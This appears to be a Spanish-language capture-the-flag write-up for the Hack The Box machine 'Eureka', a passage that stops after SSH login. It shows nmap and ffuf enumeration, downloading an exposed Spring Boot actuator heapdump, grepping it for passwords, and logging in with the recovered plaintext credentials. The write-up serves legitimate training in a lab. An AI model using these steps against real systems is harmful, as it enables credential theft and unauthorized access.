# Hack The Box - Eureka
**Plataforma**: HackTheBox  
**Nivel**: Hard  
**Sistema operativo**: Linux  
**Dirección IP**: 10.10.11.66  
**Fecha Pwned**: 15 Jul 2025

### 1. Primero ingresamos a la pagina de Hack The Box: https://www.hackthebox.com/ con nuestro respectivo usuario.
   
   **USUARIO**: jeax1415
   
   <img width="1917" height="908" alt="image" src="https://github.com/user-attachments/assets/9e8255b1-3513-436e-b05b-73abd4ac30ac" />


### 2. Por consiguiente para poder atacar las maquinas, necesitamos conectarnos a la red privada de HTB. Para esto, HTB nos da un archivo .ovpn(configuración de VPN)

   **Este archivo es único para cada cuenta**

   <img width="886" height="417" alt="image" src="https://github.com/user-attachments/assets/f15a40cb-295a-4ff7-8ce9-0be663df2450" />

### 3. Ahora nos conectamos  a la red de HTB desde kali

   Una vez descargado el archivo `.ovpn`, lo utilizamos para establecer una conexión segura con la red privada de Hack The Box usando `openvpn`:

   ```bash
   sudo openvpn NOMBRE_ARCHIVO.ovpn
   ```

   Al ejecutarlo correctamente, veremos un mensaje como:
   
   ```bash
   Initialization Sequence Completed
   ```
   <img width="871" height="77" alt="image" src="https://github.com/user-attachments/assets/1901bce8-1db2-4eff-bf44-9bc2d90a7f8c" />

### 4. Selección de la máquina objetivo 
   
   Una vez conectados a la red VPN de Hack The Box, nos dirigimos a la sección **"Machines"** para elegir una máquina activa que deseamos atacar. En este caso, seleccionamos la máquina:
   **Eureka**  
   Dificultad: Hard  

   <img width="886" height="439" alt="image" src="https://github.com/user-attachments/assets/86f6efd6-e154-467f-bf33-d9761ce9c386" />
   
   Dirección IP: `10.10.11.66`
   
   <img width="886" height="401" alt="image" src="https://github.com/user-attachments/assets/067a8881-0153-4a9b-bcb4-703c562211ad" />


### 5. Confirmación de conección

   Una vez conectado, podemos confirmar que estamos en la red de HTB usando:

   ```bash
   ip a 
   ```

   Debemos ver una interfaz tun0 con una IP asignada por HTB.

   <img width="886" height="348" alt="image" src="https://github.com/user-attachments/assets/e6fa170e-5fa1-4393-8b71-7fb747ce3723" />

### 6. Enumeración de servicios

   Continuamos con un escaneo básico con nmap para poder identificar los servicios expuestos en la máquina Eureka.

   ```bash
   nmap -sCV -Pn -T4 -oN eureka-nmap.txt 10.10.11.66 
   ```

   <img width="886" height="369" alt="image" src="https://github.com/user-attachments/assets/143d8e83-9164-47cc-a32f-c6484bd00849" />

### 7. Configuramos el dominio en /etc/hosts

   Como observamos en el resultado del escaneo con nmap, el servidor HTTP hace un redireccionamiento a http://furni.htb. Para que este dominio sea reconocible en nuestra máquina local (Kali Linux), debemos          añadirlo al archivo ´/etc/hosts´ apuntando a la IP de la máquina:

   ```bash
   sudo nano /etc/hosts
   ```

   Y añadimos la siguiente línea al final del archivo:

   ```bash
   10.10.11.66 furni.htb
   ```

   <img width="1287" height="201" alt="image" src="https://github.com/user-attachments/assets/3f87c6fc-2b90-4d24-ba2b-a3fb07adbc0f" />

### 8. Accedemos al sitio web

   Una vez añadido el dominio, abrimos nuestro navegador en Kali y visitamos:

   ```bash
    http://furni.htb
   ```

   Ahora veremos una página web de una tienda de muebles con interfaz moderna. 
   
   <img width="886" height="460" alt="image" src="https://github.com/user-attachments/assets/7c46377f-8844-490a-a0b6-9184e8c2b5f4" />


   A continuación exploraremos este sitio y realizaremos un análisis de directorios para descubrir posibles rutas ocultas.



### 9. Organizamos el entorno 

   Antes de comenzar con los análisis, organizamos un entorno limpio para trabajar con esta máquina:

   ```bash
    mkdir ~/HTB/Eureka
    cd ~/HTB/Eureka
   ```

   Esto nos permitara poder mantener todos los archivos relacionados con Eureka separados y ordenados

### 10. Enumeración de rutas con ´ffuf´

   Una vez que configuramos el dominio ´furni.htb´ en ´/etc/hosts´ y estando dentro del directorio ´~/HTB/Eureka´, se ejecuta un escaneo de rutas con ´ffuf´:
   
   ```bash
    ffuf -u http://furni.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt -o ffuf_furni.txt
   ```

   <img width="910" height="672" alt="image" src="https://github.com/user-attachments/assets/ddc2285c-fc2e-4770-99f5-b0a2bde9c159" />

### 11. Enumeación de rutas ocultas:

   Tenemos que tener en cuenta que muchos frameworks modernos como **Spring Boot** exponen un conjunto de endpoints de monitoreo y administración bajo /actuator.

   Por lo que ahora veremos si existe el panel de administrción de Spring Boot:

   Primero creamos un pequeño wordlist para fuzzear posibles rutas sensibles:
    
   ```bash
     echo -e "actuator\nactuator/env\nactuator/heapdump\nactuator/beans\nactuator/info\nactuator/metrics" > tiny.txt
   ```

   y luego lanzamos ´ffuf´ contra 'furni.htb´

   ```bash
     ffuf -u http://furni.htb/FUZZ -w tiny.txt -o ffuf_actuator.txt
   ```
   
   <img width="762" height="536" alt="image" src="https://github.com/user-attachments/assets/3f7db983-2ef9-4cdc-8735-3b67416ad60e" />

   Aqui descubrimos que el backend está usando Spring Boot con el panel ´/actuator´ expuesto sin autenticación

   Podemos ver que el endpoint más interesante es:

   ´/actuator/heapdump´


### 12. Descarga y el analisis del ´Heapdump´

   Descargamos el archivo con curl:
   
   ```bash
    curl http://furni.htb/actuator/heapdump -o heapdump.bin
   ```

   <img width="652" height="107" alt="image" src="https://github.com/user-attachments/assets/2fdff3fe-8ae7-49ee-8d26-0e2564f54202" />

   Una vez descargado, usamos strings para extraer cadenas legibles del binario y guardar la salida:
   
   <img width="441" height="62" alt="image" src="https://github.com/user-attachments/assets/40a4d4ab-813a-42dd-adee-821349f62dc4" />


### 13. Extracción de credenciales


   Analizamos el archivo con grep:

   ```bash
    grep -Ei 'password[ ]*[:=][ ]*[^[:space:]"]+' heap_strings.txt
   ```

   <img width="1640" height="131" alt="image" src="https://github.com/user-attachments/assets/d030b451-918d-44a4-9d3f-4e34ff155681" />

   Obtenemos la siguiente entrada:

   ```bash
    {password=0sc@r190_S0l!dP@sswd, user=oscar190}
   ```

   Estas credenciales corresponden al usuario oscar190, lo cual fue confirmado con un acceso exitoso vía SSH:

   ```bash
    ssh oscar190@furni.htb
   ```

   <img width="957" height="768" alt="image" src="https://github.com/user-attachments/assets/a2f98c25-0dcb-4fee-8bfc-358b54d68262" />


  Ahora revisamos que servicios estan expuestos en localhost con:

  ```bash
    ss -tlnp | grep LISTEN
  ```
